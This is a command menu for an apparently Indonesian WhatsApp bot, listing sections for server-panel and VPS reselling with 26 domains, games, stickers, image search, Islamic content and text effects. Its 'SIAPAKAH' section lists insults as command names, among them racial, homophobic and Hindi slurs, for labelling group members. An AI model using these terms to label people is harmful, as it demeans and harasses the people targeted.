     ヤ ◦ ᴛᴏᴜᴋᴀᴄʜᴀɴ
     ヤ ◦ ᴛꜱᴜɴᴀᴅᴇ
     ヤ ◦ ᴡᴀɪꜰᴜ
     ヤ ◦ ᴀɴɪᴍᴇᴡᴀʟʟ
     ヤ ◦ ʏᴏᴛꜱᴜʙᴀ
     ヤ ◦ ʏᴜᴋɪ
     ヤ ◦ ʏᴜʟɪʙᴏᴄɪʟ
     ヤ ◦ ʏᴜᴍᴇᴋᴏ
     ヤ ◦ 8ʙᴀʟʟ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀɢɪꜰ
     ヤ ◦ ꜰᴇᴇᴅ
     ヤ ◦ ᴡᴀɪꜰᴜ
     ヤ ◦ ɴᴇᴋᴏ
  
⫹┈─────────────────┈⫺
*メ P A N E L M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ʀᴀᴍʟɪꜱᴛ
     ヤ ◦ ʙᴀᴄᴋᴜᴘ
     ヤ ◦ ᴛᴜᴛᴏʀɪᴀʟ
     ヤ ◦ ꜱᴛᴀʀᴛꜱʀᴠ 
     ヤ ◦ ᴜɴꜱᴜꜱᴘᴇɴᴅ
     ヤ ◦ ᴡᴇʙᴘᴀɴᴇʟ
     ヤ ◦ ꜱᴜꜱᴘᴇɴᴅ
     ヤ ◦ ꜱᴇɴᴅᴘᴀɴᴇʟ
     ヤ ◦ ᴀᴅᴅꜱʀᴠ
     ヤ ◦ ʟɪꜱᴛᴀᴅᴍɪɴ
     ヤ ◦ ᴀᴅᴍɪɴ
     ヤ ◦ ᴀᴅᴅᴜꜱᴇʀ
     ヤ ◦ ᴅᴇʟᴜꜱʀ
     ヤ ◦ ʟɪꜱᴛᴜꜱʀ
     ヤ ◦ ʟɪꜱᴛꜱʀᴠ
     ヤ ◦ ᴜᴘᴅᴀᴛᴇꜱʀᴠ
     ヤ ◦ ᴅᴇᴛᴜꜱʀ
     ヤ ◦ ʀᴇɪɴꜱᴛᴀʟʟ
     ヤ ◦ ᴄᴘᴀɴᴇʟ
     ヤ ◦ ᴘᴀɴᴇʟ
     ヤ ◦ 1ɢʙ
     ヤ ◦ 2ɢʙ
     ヤ ◦ 3ɢʙ
     ヤ ◦ 4ɢʙ
     ヤ ◦ 5ɢʙ
     ヤ ◦ 6ɢʙ
     ヤ ◦ 7ɢʙ
     ヤ ◦ 8ɢʙ
     ヤ ◦ ᴜɴʟɪ
     ヤ ◦ 1ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 2ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 3ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 4ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 5ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 6ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 7ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 8ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ ᴜɴʟɪꜱᴀʟᴅᴏ

⫹┈─────────────────┈⫺
*メ L I S T D O M A I N メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴅ1 pterodactyl-vvip.my.id
     ヤ ◦ ᴅ2 mypanell.biz.id
     ヤ ◦ ᴅ3 piwzstoreee.my.id
     ヤ ◦ ᴅ4 piwzpediaaa.biz.id
     ヤ ◦ ᴅ5 piwzpanel.me
     ヤ ◦ ᴅ6 slimextzy.my.id
     ヤ ◦ ᴅ7 raikyxzhost.xyz
     ヤ ◦ ᴅ8 tokopanellku.my.id
     ヤ ◦ ᴅ9 serverpanell.biz.id
     ヤ ◦ ᴅ10 skyzo.my.id
     ヤ ◦ ᴅ11 digitalserver.biz.id
     ヤ ◦ ᴅ12 sellerpanel-vvip.my.id
     ヤ ◦ ᴅ13 rajapanel.xyz
     ヤ ◦ ᴅ14 panelvvip.biz.id
     ヤ ◦ ᴅ15 celiaofficial.my.id
     ヤ ◦ ᴅ16 celiastore.my.id
     ヤ ◦ ᴅ17 panellofficial.site
     ヤ ◦ ᴅ18 panellofficial.my.id
     ヤ ◦ ᴅ19 celiapanellstore.my.id
     ヤ ◦ ᴅ20 rullz.me
     ヤ ◦ ᴅ21 panelxdzz.tech️
     ヤ ◦ ᴅ22 panelzerone.xyz
     ヤ ◦ ᴅ23 panell.icu
     ヤ ◦ ᴅ24 panellstoree.com
     ヤ ◦ ᴅ25 raikyxzhost.biz.id
     ヤ ◦ ᴅ26 allxddev.xyz
     
⫹┈─────────────────┈⫺ 
*メ D O M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ꜱɪꜱᴀᴅʀᴏᴘʟᴇᴛ
     ヤ ◦ ʀᴇꜱᴛᴀʀᴛᴠᴘꜱ
     ヤ ◦ ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
     ヤ ◦ ʟɪꜱᴛᴅʀᴏᴘʟᴇᴛ
     ヤ ◦ ᴄᴇᴋᴅʀᴏᴘʟᴇᴛ
     ヤ ◦ ᴠᴘꜱ1ɢ1ᴄ
     ヤ ◦ ᴠᴘꜱ2ɢ1ᴄ
     ヤ ◦ ᴠᴘꜱ2ɢ2ᴄ
     ヤ ◦ ᴠᴘꜱ4ɢ2ᴄ
     ヤ ◦ ᴠᴘꜱ8ɢ4ᴄ
     ヤ ◦ ꜱᴠᴘꜱ
     ヤ ◦ ꜱᴇɴᴅᴠᴘꜱ
     ヤ ◦ ᴛᴜʀɴᴏꜰꜰ
     ヤ ◦ ᴛᴜʀɴᴏɴ
     ヤ ◦ ʀᴇʙᴜɪʟᴅ

⫹┈─────────────────┈⫺ 
*メ L I N O D E M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ʀᴇꜱᴇᴛᴘᴀꜱꜱᴡᴏʀᴅ
     ヤ ◦ ᴅᴇʟᴇᴛᴇʟɪɴᴏᴅᴇ
     ヤ ◦ ʟɪꜱᴛʟɪɴᴏᴅᴇ
     ヤ ◦ ᴏɴʟɪɴᴏᴅᴇ
     ヤ ◦ ᴏꜰꜰʟɪɴᴏᴅᴇ
     ヤ ◦ ʀᴇʙᴏᴏᴛʟɪɴᴏᴅᴇ
     ヤ ◦ ʀᴇʙᴜɪʟᴅʟɪɴᴏᴅᴇ
     ヤ ◦ ꜱɪꜱᴀʟɪɴᴏᴅᴇ
     ヤ ◦ ꜱᴀʟᴅᴏʟɪɴᴏᴅᴇ
     ヤ ◦ ᴄᴇᴋᴠᴘꜱʟɪɴᴏᴅᴇ
     ヤ ◦ ʟɪɴᴏᴅᴇ2ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ4ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ8ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ16ɢʙ

⫹┈─────────────────┈⫺
*メ S T O R E M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴘᴀʏᴍᴇɴᴛ
     ヤ ◦ lynnzxd
     ヤ ◦ ʟɪꜱᴛᴘʀᴏᴅᴜᴋ
     ヤ ◦ ʟɪꜱᴛᴅᴏ
     ヤ ◦ ʟɪꜱᴛᴘᴀɴᴇʟ
     ヤ ◦ ʟɪꜱᴛᴠᴘꜱ
     ヤ ◦ ᴘᴀɴᴇʟ
     ヤ ◦ ʙᴀᴛᴀʟ
     ヤ ◦ ᴘʀᴏꜱᴇꜱ
     ヤ ◦ ᴅᴏɴᴇ
     ヤ ◦ ꜰᴏʀᴍᴀᴛɴᴇᴇᴅ
     ヤ ◦ ꜰᴏʀᴍᴀᴛᴊᴘ
     ヤ ◦ ᴅᴏɴᴀꜱɪ

⫹┈─────────────────┈⫺
*メ V O I C E M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ʙᴀꜱꜱ
     ヤ ◦ ʙʟᴏᴡɴ
     ヤ ◦ ᴅᴇᴇᴘ
     ヤ ◦ ᴇᴀʀʀᴀᴘᴇ
     ヤ ◦ ꜰᴀꜱᴛ
     ヤ ◦ ꜰᴀᴛ
     ヤ ◦ ɴɪɢʜᴛᴄᴏʀᴇ
     ヤ ◦ ʀᴇᴠᴇʀꜱᴇ 
     ヤ ◦ ʀᴏʙᴏᴛ
     ヤ ◦ ꜱʟᴏᴡ
     ヤ ◦ ꜱᴍᴏᴏᴛʜ
     ヤ ◦ ꜱQᴜɪʀʀᴇʟ

⫹┈─────────────────┈⫺
*メ G A M E M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴛᴇʙᴀᴋʙᴏᴍ
     ヤ ◦ sᴜɪᴛᴘᴠᴘ
     ヤ ◦ ᴛᴇʙᴀᴋᴋᴀᴛᴀ
     ヤ ◦ ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
     ヤ ◦ sᴜsᴜɴᴋᴀᴛᴀ
     ヤ ◦ ᴛɪᴄᴛᴀᴄᴛᴏᴇ
     ヤ ◦ ᴛᴇʙᴀᴋᴊᴋᴛ48
     ヤ ◦ ᴛᴇᴋᴀᴛᴇᴋɪ
     ヤ ◦ ᴄᴀᴋʟᴏɴᴛᴏɴɢ
     ヤ ◦ sɪᴀᴘᴀᴋᴀʜᴀᴋᴜ
     ヤ ◦ ᴛᴇʙᴀᴋʟɪʀɪᴋ

⫹┈─────────────────┈⫺
*メ R A N D O M T T M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴛɪᴋᴛᴏᴋɢɪʀʟ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɴᴜᴋᴛʜʏ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴋᴀʏᴇꜱ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴘᴀɴʀɪᴋᴀ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɴᴏᴛɴᴏᴛ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɢʜᴇᴀ
     ヤ ◦ ᴛɪᴋᴛᴏᴋꜱᴀɴᴛᴜʏ
     ヤ ◦ ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ

⫹┈─────────────────┈⫺
*メ S T I C K E R M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴡᴏᴏꜰ
     ヤ ◦ 8ʙᴀʟʟ
     ヤ ◦ ɢᴏᴏɢʟᴇ
     ヤ ◦ ɢᴇᴛᴘɪᴄ
     ヤ ◦ ꜰᴇᴇᴅ
     ヤ ◦ ᴀᴠᴀᴛᴀʀ
     ヤ ◦ ꜰᴏx_ɢɪʀ
     ヤ ◦ ʟɪᴢᴀʀᴅ
     ヤ ◦ ꜱᴘᴀɴᴋ
     ヤ ◦ ᴍᴇᴏᴡ
     ヤ ◦ ᴛᴏɪᴍɢ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀ
     
⫹┈─────────────────┈⫺
*メ S E A R C H M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ɢᴏᴏɢʟᴇ
     ヤ ◦ ʟɪʀɪᴋ
     ヤ ◦ ᴛᴛꜱᴇᴀᴄʀʜ
     ヤ ◦ ʀᴇᴀᴅᴍᴏʀᴇ
     ヤ ◦ ᴀᴘᴋꜱᴇᴀʀᴄʜ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀꜱᴇᴀʀᴄʜ
     ヤ ◦ ᴊᴀʀᴀᴋ
     ヤ ◦ ꜱꜱᴡᴇʙ
     ヤ ◦ ꜱꜱᴡᴇʙᴅᴇꜱᴋᴛᴏᴘ
     ヤ ◦ ꜱꜱᴡᴇʙᴛᴀʙʟᴇᴛ
     ヤ ◦ ꜱꜱᴡᴇʙᴘʜᴏɴᴇ
     ヤ ◦ ꜱᴄ
     ヤ ◦ ᴏᴡɴᴇʀ
     ヤ ◦ ʀᴜʟᴇꜱ
     ヤ ◦ ᴀɪ
     ヤ ◦ ᴛɪᴋᴛᴏᴋꜱᴛᴀʟᴋ
     ヤ ◦ ɢᴀᴍᴇᴘᴏᴘ
     ヤ ◦ ᴋᴜʟɪɴᴇʀ
     ヤ ◦ ᴏᴛᴀᴋᴜᴅᴇꜱᴅᴇᴛᴀɪʟꜱ
     ヤ ◦ ᴏᴛᴀᴋᴜᴅᴇꜱꜱᴇᴀʀᴄʜ
     ヤ ◦ ꜱɪᴀᴘᴀᴋᴀʜ
     ヤ ◦ ᴋᴄɪᴍɢ
     ヤ ◦ ᴍᴏᴅᴀᴘᴋ
     ヤ ◦ Qᴜᴏᴛᴇꜱ
     ヤ ◦ ɪꜱʟᴀᴍɴᴇᴡꜱ
     ヤ ◦ Qᴜᴏᴛᴇꜱᴀɴɪᴍᴇ
     ヤ ◦ Qᴜᴏᴛᴇꜱʙᴀᴄᴏᴛ
     ヤ ◦ ᴄᴜᴀᴄᴀ
     ヤ ◦ ꜰʟɪᴘᴛᴇxᴛ

⫹┈─────────────────┈⫺
*メ I S L AM M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴋɪꜱᴀʜɴᴀʙɪ
     ヤ ◦ Qᴜᴏᴛᴇꜱɪꜱʟᴀᴍɪ
     ヤ ◦ ɴɪᴀᴛꜱʜᴏʟᴀᴛ
     ヤ ◦ ʙᴀᴄᴀᴀɴꜱʜᴏʟᴀᴛ
     ヤ ◦ ᴅᴏᴀʜᴀʀɪᴀɴ
     ヤ ◦ ᴀʏᴀᴛᴋᴜʀꜱɪ

⫹┈─────────────────┈⫺
*メ A D D M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ꜱᴇᴛᴄᴍᴅ
     ヤ ◦ ᴅᴇʟᴄᴍᴅ
     ヤ ◦ ʟɪꜱᴛᴄᴍᴅ
     ヤ ◦ ᴀᴅᴅᴘᴅꜰ
     ヤ ◦ ᴅᴇʟᴘᴅꜰ
     ヤ ◦ ʟɪꜱᴛᴘᴅꜰ
     ヤ ◦ ʏᴏᴘᴅꜰ
     ヤ ◦ ꜱᴇɴᴅᴘᴅꜰ
     ヤ ◦ ᴀᴅᴅᴢɪᴘ
     ヤ ◦ ᴅᴇʟᴢɪᴘ
     ヤ ◦ ʟɪꜱᴛᴢɪᴘ
     ヤ ◦ ʏᴏᴢɪᴘ
     ヤ ◦ ꜱᴇɴᴅᴢɪᴘ
     ヤ ◦ ᴀᴅᴅᴀᴘᴋ
     ヤ ◦ ᴅᴇʟᴀᴘᴋ
     ヤ ◦ ʟɪꜱᴛᴀᴘᴋ
     ヤ ◦ ʏᴏᴀᴘᴋ
     ヤ ◦ ꜱᴇɴᴅᴀᴘᴋ
     ヤ ◦ ᴀᴅᴅᴠɴ
     ヤ ◦ ᴅᴇʟᴠɴ
     ヤ ◦ ʟɪꜱᴛᴠɴ
     ヤ ◦ ᴀᴅᴅᴍꜱɢ
     ヤ ◦ ꜱᴇɴᴅʟɪꜱᴛ
     ヤ ◦ ʟɪꜱᴛᴍꜱɢ
     ヤ ◦ ᴅᴇʟᴍꜱɢ
     ヤ ◦ ɢᴇᴛᴍꜱɢ

⫹┈─────────────────┈⫺
*メ S I A P A K A H M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴛᴏʟᴏʟ
     ヤ ◦ ɢᴀɢᴜɴᴀ
     ヤ ◦ ᴊᴏᴍᴏᴋ
     ヤ ◦ ɪᴅɪᴏᴛ
     ヤ ◦ ɢᴀʏ
     ヤ ◦ ʟᴇꜱʙɪ
     ヤ ◦ ᴀɴᴊɪɴᴋ
     ヤ ◦ ʙᴀʙɪ
     ヤ ◦ ᴋᴜᴄɪɴɢ
     ヤ ◦ ʙᴇʙᴀɴ
     ヤ ◦ ʙᴇʙᴀɴᴋᴇʟᴜᴀʀɢᴀ
     ヤ ◦ ɢᴀᴅᴀᴋᴇʟᴜᴀʀɢᴀ
     ヤ ◦ ᴍɪꜱᴋɪɴ
     ヤ ◦ ꜱᴀᴍᴘᴀʜ
     ヤ ◦ ᴡɪʙᴜ
     ヤ ◦ ᴄᴀɴᴛɪᴋ
     ヤ ◦ ɢᴀɴᴛᴇɴɢ
     ヤ ◦ ᴛᴀᴍᴘᴀɴ
     ヤ ◦ ᴄᴜᴛᴇ
     ヤ ◦ ᴋɪɴᴅ
     ヤ ◦ ɪꜱʟᴀᴍ
     ヤ ◦ ᴋʀɪꜱᴛᴇɴ
     ヤ ◦ ʜɪɴᴅᴜ
     ヤ ◦ ᴋᴀᴛᴏʟɪᴋ
     ヤ ◦ ɢᴀɴᴅᴜ
     ヤ ◦ ᴍᴀᴅᴀʀᴄʜᴏᴅ
     ヤ ◦ ᴋᴀʟᴀ
     ヤ ◦ ɢᴏʀᴀ
     ヤ ◦ ᴄʜᴜᴛɪʏᴀ
     ヤ ◦ ɴɪʙʙᴀ
     ヤ ◦ ɴɪʙʙɪ
     ヤ ◦ ʙʜᴏꜱᴅɪᴡᴀʟᴀ
     ヤ ◦ ᴄʜᴜᴛᴍᴀʀɪᴋᴀ
     ヤ ◦ ʙᴏᴋᴀᴄʜᴏᴅᴀ
     ヤ ◦ ꜱᴜᴀʀᴇʀʙᴀᴄᴄʜᴀ
     ヤ ◦ ʙᴏʟᴏᴄʜᴏᴅᴀ
     ヤ ◦ ᴍᴜᴛʜᴀʟ
     ヤ ◦ ᴍᴜᴛʜʙᴀᴀᴢ
     ヤ ◦ ʀᴀɴᴅɪʙᴀᴀᴢ
     ヤ ◦ ᴛᴏᴘɪʙᴀᴀᴢ
     ヤ ◦ ᴄᴜɴᴛ
     ヤ ◦ ɴᴇʀᴅ
     ヤ ◦ ʙᴇʜᴇɴᴄʜᴏᴅ
     ヤ ◦ ʙᴇʜɴᴄʜᴏᴅᴀ
     ヤ ◦ ʙʜᴏꜱᴅɪᴋᴀ
     ヤ ◦ ɴᴇʀᴅ
     ヤ ◦ ᴍᴄ
     ヤ ◦ ʙꜱᴅᴋ
     ヤ ◦ ʙʜᴏꜱᴅᴋ
     ヤ ◦ ɴɪɢɢᴇʀ
     ヤ ◦ ʟᴏᴅᴀ
     ヤ ◦ ʟᴀᴜɴᴅ
     ヤ ◦ ɴɪɢɢᴀ
     ヤ ◦ ɴᴏᴏʙʀᴀ
     ヤ ◦ ᴛʜᴀʀᴋɪ
     ヤ ◦ ɴɪʙʙᴀ
     ヤ ◦ ɴɪʙʙɪ
     ヤ ◦ ᴍᴜᴍᴜ
     ヤ ◦ ʀᴀꜱᴄᴀʟ
     ヤ ◦ ꜱᴄᴜᴍʙᴀɢ
     ヤ ◦ ɴᴜᴛꜱ
     ヤ ◦ ᴄᴏᴍʀᴀᴅᴇ
     ヤ ◦ ꜰᴀɢᴏᴛ
     ヤ ◦ ꜱᴄᴏᴜɴᴅʀᴇʟ
     ヤ ◦ ᴅɪᴛᴄʜ
     ヤ ◦ ᴅᴏᴘᴇ
     ヤ ◦ ɢᴜᴄᴄɪ
     ヤ ◦ ʟɪᴛ
     ヤ ◦ ᴅᴜᴍʙᴀꜱꜱ
     ヤ ◦ ꜱᴇxʏ
     ヤ ◦ ᴄʀᴀᴄᴋʜᴇᴀᴅ
     ヤ ◦ ᴍꜰ
     ヤ ◦ ᴍᴏᴛʜᴇʀꜰᴜᴄᴋᴇʀ
     ヤ ◦ ᴅᴏɢʟᴀ
     ヤ ◦ ʙᴇᴡᴅᴀ
     ヤ ◦ ʙᴏᴋᴀ
     ヤ ◦ ᴋʜᴀɴᴋɪ
     ヤ ◦ ʙᴀʟ 
     ヤ ◦ ꜱᴜᴄᴋᴇʀ
     ヤ ◦ ꜰᴜᴄᴋʙᴏʏ
     ヤ ◦ ᴘʟᴀʏʙᴏʏ
     ヤ ◦ ꜰᴜᴄᴋɢɪʀʟ
     ヤ ◦ ᴘʟᴀʏɢɪʀʟ
     ヤ ◦ ʜᴏᴛ

⫹┈─────────────────┈⫺
*メ R A N D O M F T M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴀᴇꜱᴛʜᴇᴛɪᴄ
     ヤ ◦ ᴄᴏꜰꜰᴇᴇ
     ヤ ◦ ᴡɪᴋɪᴍᴇᴅɪᴀ
     ヤ ◦ ᴡᴀʟʟᴘᴀᴘᴇʀ
     ヤ ◦ ᴀʀᴛ
     ヤ ◦ ʙᴛꜱ
     ヤ ◦ ᴅᴏɢᴡᴏᴏꜰ
     ヤ ◦ ᴄᴀᴛᴍᴇᴏᴡ
     ヤ ◦ ʟɪᴢᴀʀᴅᴘɪᴄ
     ヤ ◦ ɢᴏᴏꜱᴇʙɪʀᴅ
     ヤ ◦ 8ʙᴀʟʟᴘᴏᴏʟ
     ヤ ◦ ᴄᴏꜱᴘʟᴀʏ
     ヤ ◦ ʜᴀᴄᴋᴇʀ
     ヤ ◦ ᴄʏʙᴇʀ
     ヤ ◦ ɢᴀᴍᴇᴡᴀʟʟᴘᴀᴘᴇʀᴍ
     ヤ ◦ ɪꜱʟᴀᴍɪᴄ
     ヤ ◦ ᴊᴇɴɴɪᴇ
     ヤ ◦ ᴊɪꜱᴏ
     ヤ ◦ ꜱᴀᴛᴀɴɪᴄ
     ヤ ◦ ᴊᴜꜱᴛɪɴᴀ
     ヤ ◦ ᴄᴀʀᴛᴏᴏɴ
     ヤ ◦ ᴘᴇɴᴛᴏʟ
     ヤ ◦ ᴄᴀᴛ
     ヤ ◦ ᴋᴘᴏᴘ
     ヤ ◦ ᴇxᴏ
     ヤ ◦ ʟɪꜱᴀ
     ヤ ◦ ꜱᴘᴀᴄᴇ
     ヤ ◦ ᴄᴀʀ
     ヤ ◦ ᴛᴇᴄʜɴᴏʟᴏɢʏ
     ヤ ◦ ʙɪᴋᴇ
     ヤ ◦ ꜱʜᴏʀᴛQᴜᴏᴛᴇ
     ヤ ◦ ᴀɴᴛɪᴡᴏʀᴋ
     ヤ ◦ ʜᴀᴄᴋɪɴɢ
     ヤ ◦ ʙᴏɴᴇᴋᴀ
     ヤ ◦ ʀᴏꜱᴇ
     ヤ ◦ ʀʏᴜᴊɪɴ
     ヤ ◦ ᴜʟᴢᴢᴀɴɢʙᴏʏ
     ヤ ◦ ᴜʟᴢᴢᴀɴɢɢɪʀʟ
     ヤ ◦ ᴡᴀʟʟ
     ヤ ◦ ᴡᴀʟʟᴘʜᴏɴᴇ
     ヤ ◦ ᴍᴏᴜɴᴛᴀɪɴ
     ヤ ◦ ɢᴏᴏꜱᴇ
     ヤ ◦ ᴘʀᴏꜰɪʟᴇᴘɪᴄ
     ヤ ◦ ᴄᴏᴜᴘʟᴇᴘᴘ
     ヤ ◦ ᴘʀᴏɢʀᴀᴍᴍɪɴɢ
     ヤ ◦ ᴘᴜʙɢ
     ヤ ◦ ʙʟᴀᴄᴋᴘɪɴᴋ
     ヤ ◦ ʀᴀɴᴅᴏᴍʙᴏʏ
     ヤ ◦ ʀᴀɴᴅᴏᴍɢɪʀʟ
     ヤ ◦ ʜɪᴊᴀʙ
     ヤ ◦ ᴄʜɪɴᴇꜱᴇ
     ヤ ◦ ɪɴᴅᴏ
     ヤ ◦ ᴊᴀᴘᴀɴᴇꜱᴇ
     ヤ ◦ ᴋᴏʀᴇᴀɴ
     ヤ ◦ ᴍᴀʟᴀʏ
     ヤ ◦ ᴛʜᴀɪ
     ヤ ◦ ᴠɪᴇᴛɴᴀᴍᴇꜱᴇ
     ヤ ◦ ꜱᴜɢᴀ
     ヤ ◦ ᴡᴜʏɪꜰᴀɴ
     ヤ ◦ ᴘᴀʀᴋᴄʜᴀɴʏᴇᴏʟ
     ヤ ◦ ᴏʜꜱᴇʜᴜɴ
     ヤ ◦ ʟᴜʜᴀɴ
     ヤ ◦ ᴋɪᴍᴛᴀᴇʜʏᴜɴɢ
     ヤ ◦ ᴋɪᴍꜱᴏᴇᴋ
     ヤ ◦ ᴋɪᴍɴᴀɴᴊᴏᴏɴ
     ヤ ◦ ᴋɪᴍᴊᴜɴᴍʏᴇᴏɴ
     ヤ ◦ ᴋɪᴍᴊᴏɴɢ
     ヤ ◦ ᴋɪᴍᴊᴏɴᴅᴀᴇ
     ヤ ◦ ᴊᴜɴɢᴋᴏᴏᴋ
     ヤ ◦ ᴊɪᴍɪɴ
     ヤ ◦ ᴊʜᴏᴘᴇ
     ヤ ◦ ʜᴜᴀɴɢᴢɪᴛᴀᴏ
     ヤ ◦ ᴅᴏʜᴋʏᴜɴɢꜱᴏᴏ
     ヤ ◦ ʙᴀᴇᴋʜʏᴜɴɢ

⫹┈─────────────────┈⫺
*メ T E X T M A K E R M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦  ʙʟᴀᴄᴋᴘɪɴᴋ
     ヤ ◦  ʀᴀɪɴʙᴏᴡ2
     ヤ ◦  ᴡᴀᴛᴇʀ_ᴘɪᴘᴇ
     ヤ ◦  ʜᴀʟʟᴏᴡᴇᴇɴ
     ヤ ◦  ꜱᴋᴇᴛᴄʜ
     ヤ ◦  ꜱɪʀᴄᴜɪᴛ
     ヤ ◦  ᴅɪꜱᴄᴏᴠᴇʀʏ
     ヤ ◦  ᴍᴇᴛᴀʟʟɪᴄ2
     ヤ ◦  ꜰɪᴄᴛɪᴏɴ
     ヤ ◦  ᴅᴇᴍᴏɴ
     ヤ ◦  ᴛʀᴀɴꜱꜰᴏʀᴍᴇʀ
     ヤ ◦  ʙᴇʀʀʏ
     ヤ ◦  ᴛʜᴜɴᴅᴇʀ
     ヤ ◦  ᴍᴀɢᴍᴀ
     ヤ ◦  3ᴅꜱᴛᴏɴᴇ
     ヤ ◦  ɴᴇᴏɴ
     ヤ ◦  ɢʟɪᴛᴄʜ
     ヤ ◦  ʜᴀʀʀʏ_ᴘᴏᴛᴛᴇʀ
     ヤ ◦  ᴇᴍʙᴏꜱꜱᴇᴅ
     ヤ ◦  ʙʀᴏᴋᴇɴ
     ヤ ◦  ᴘᴀᴘᴇʀᴄᴜᴛ
     ヤ ◦  ɢʀᴀᴅɪᴇɴᴛ
     ヤ ◦  ɢʟᴏꜱꜱʏ
     ヤ ◦  ᴡᴀᴛᴇʀᴄᴏʟᴏʀ
     ヤ ◦  ᴍᴜʟᴛɪᴄᴏʟᴏʀ
     ヤ ◦  ɴᴇᴏɴ_ᴅᴇᴠɪʟ
     ヤ ◦  ᴜɴᴅᴇʀᴡᴀᴛᴇʀ
     ヤ ◦  ʙᴇᴀʀ
     ヤ ◦  ᴡᴏɴᴅᴇʀꜰᴜʟɢ
     ヤ ◦  ᴄʜʀɪꜱᴛᴍᴀꜱ
     ヤ ◦  ɴᴇᴏɴʟɪɢᴛʜ2
     ヤ ◦  ᴛʜᴜɴᴅᴇʀ2
     ヤ ◦  3ᴅʙᴏx
     ヤ ◦  ɴᴇᴏɴ2
     ヤ ◦  ʀᴏᴀᴅᴡ
     ヤ ◦  ʙᴏᴋᴇʜ
     ヤ ◦  ɢɴᴇᴏɴ
     ヤ ◦  ᴀᴅᴠᴀɴᴄᴇᴅ
     ヤ ◦  ᴅʀᴏᴘᴡᴀᴛᴇʀ
     ヤ ◦  ᴡᴀʟʟ
     ヤ ◦  ᴄʜʀɪꜱᴍᴀꜱᴛ
     ヤ ◦  ʜᴏɴᴇʏ
     ヤ ◦  ᴅʀᴜɢ
     ヤ ◦  ᴍᴀʀʙʟᴇ
     ヤ ◦  ᴍᴀʀʙʟᴇ2
     ヤ ◦  ɪᴄᴇ
     ヤ ◦  ᴊᴜɪᴄᴇ
     ヤ ◦  ʀᴜꜱᴛʏ
     ヤ ◦  ᴀʙꜱᴛʀᴀ
     ヤ ◦  ʙɪꜱᴄᴜɪᴛ
     ヤ ◦  ᴡᴏᴏᴅ
     ヤ ◦  ꜱᴄɪꜰɪ
     ヤ ◦  ᴍᴇᴛᴀʟʀ
     ヤ ◦  ᴘᴜʀᴘʟᴇɢ
     ヤ ◦  ꜱʜɪɴʏ
     ヤ ◦  ᴊᴇᴡᴇʟʀʏ
     ヤ ◦  ᴊᴇᴡᴇʟʀʏ2
     ヤ ◦  ᴍᴇᴛᴀʟʜ
     ヤ ◦  ɢᴏʟᴅᴇɴ
     ヤ ◦  ɢʟɪᴛᴛᴇʀ
     ヤ ◦  ᴍᴇᴛᴀʟᴇ
     ヤ ◦  ᴄᴀʀʙᴏɴ
     ヤ ◦  ᴄᴀɴᴅʏ
     ヤ ◦  ᴍᴇᴛᴀʟʙ
     ヤ ◦  ɢᴇᴍʙ
     ヤ ◦  3ᴅᴄʜʀᴏᴍᴇ
     ヤ ◦  ᴍᴇᴛᴀʟʙ2
     ヤ ◦  ᴍᴇᴛᴀʟɢ

⫹┈─────────────────┈⫺
*メ S O U N D M E N U*
⫹┈─────────────────┈⫺
     ヤ ◦ ꜱᴏᴜɴᴅ1
     ヤ ◦ ꜱᴏᴜɴᴅ2
     ヤ ◦ ꜱᴏᴜɴᴅ3
     ヤ ◦ ꜱᴏᴜɴᴅ4
     ヤ ◦ ꜱᴏᴜɴᴅ5
     ヤ ◦ ꜱᴏᴜɴᴅ6
     ヤ ◦ ꜱᴏᴜɴᴅ7
     ヤ ◦ ꜱᴏᴜɴᴅ8
     ヤ ◦ ꜱᴏᴜɴᴅ9
     ヤ ◦ ꜱᴏᴜɴᴅ10
     ヤ ◦ ꜱᴏᴜɴᴅ11
     ヤ ◦ ꜱᴏᴜɴᴅ12
     ヤ ◦ ꜱᴏᴜɴᴅ13
     ヤ ◦ ꜱᴏᴜɴᴅ14
     ヤ ◦ ꜱᴏᴜɴᴅ15
     ヤ ◦ ꜱᴏᴜɴᴅ16
     ヤ ◦ ꜱᴏᴜɴᴅ17
     ヤ ◦ ꜱᴏᴜɴᴅ18
     ヤ ◦ ꜱᴏᴜɴᴅ18
     ヤ ◦ ꜱᴏᴜɴᴅ20
     ヤ ◦ ꜱᴏᴜɴᴅ21
     ヤ ◦ ꜱᴏᴜɴᴅ22
     ヤ ◦ ꜱᴏᴜɴᴅ23
     ヤ ◦ ꜱᴏᴜɴᴅ24
